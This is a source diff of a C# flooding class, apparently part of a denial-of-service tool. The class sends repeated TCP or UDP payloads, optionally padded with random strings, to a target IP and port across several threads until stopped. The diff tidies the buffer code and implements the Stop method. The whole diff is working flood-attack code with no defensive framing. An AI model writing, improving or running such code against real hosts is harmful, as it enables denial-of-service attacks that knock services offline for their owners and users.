@@ -9,7 +9,7 @@ namespace GAS.Core
     {
         //public int Port,Protocol,Delay,FloodCount;
         int FloodCount;
-        public bool Resp, AllowRandom, IsFlooding, init = false;
+        public bool Resp, AllowRandom, init = false;
         public string Data;//,IP;
         private int Protocol;
         private Thread[] WorkingThreads;
@@ -36,15 +36,13 @@ namespace GAS.Core
             while (!init) Thread.Sleep(100);
 			try
 			{
-				byte[] buf= new byte[System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) )).Length];
-				buf= System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
+				byte[] buf= System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
 				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(Target), Port);
 				while (IsFlooding)
 				{
 					Socket socket = null;
 					switch (Protocol)
 					{
-						#region TCP
 						case 1:
 							socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp){NoDelay = true};
 							try { socket.Connect(RHost); }
@@ -55,33 +53,27 @@ namespace GAS.Core
                                 while (IsFlooding)
                                 {
                                     FloodCount++;
-                                    if (AllowRandom)
-                                        buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
+                                    if (AllowRandom) buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
                                     socket.Send(buf);
                                     if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
                                 }
                             }
                             catch { Failed++; }
 							break;
-						#endregion
-						#region UDP
 						case 2:
-							socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-							socket.Blocking = Resp;
+                            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) { Blocking = Resp };
 							try
 							{
 								while (IsFlooding)
 								{
 									FloodCount++;
-                                    if (AllowRandom)
-                                        buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
+                                    if (AllowRandom) buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
 									socket.SendTo(buf, SocketFlags.None, RHost);
 									if (Delay > 0) System.Threading.Thread.Sleep(Delay+1);
 								}
 							}
 							catch {Failed++;}
 							break;
-						#endregion
 					}
 				}
 			}
@@ -89,7 +81,10 @@ namespace GAS.Core
 		}
         public override void Stop()
         {
-            throw new NotImplementedException();
+            IsFlooding = false;
+            foreach (var x in WorkingThreads)
+                try { x.Abort(); }
+                catch { }
         }
     }
 }
